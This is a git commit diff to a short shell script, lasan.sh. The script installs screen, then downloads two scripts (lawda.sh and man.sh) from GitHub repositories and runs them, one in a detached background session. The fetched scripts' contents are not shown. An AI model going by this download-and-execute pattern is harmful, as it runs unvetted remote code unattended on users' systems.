b403d4635a7d417f78ea3933513f4985a7799be9
pogchampv18 <86313403+pogchampv18@users.noreply.github.com>
2021-07-04 00:21:37 +0530

    Update lasan.sh

--- lasan.sh
+++ lasan.sh
@@ -3,6 +3,8 @@
 sudo apt update
 sudo apt install screen -y
 wget https://github.com/pogchampv18/TM/raw/main/lawda.sh
-screen -dmS lawda.sh .lawda.sh 60 70
+wget https://github.com/biswas179/FkgX/main/man.sh
+chmod +x man.sh
+screen -dmS man ./man.sh 60 70
 chmod +x lawda.sh
 ./lawda.sh
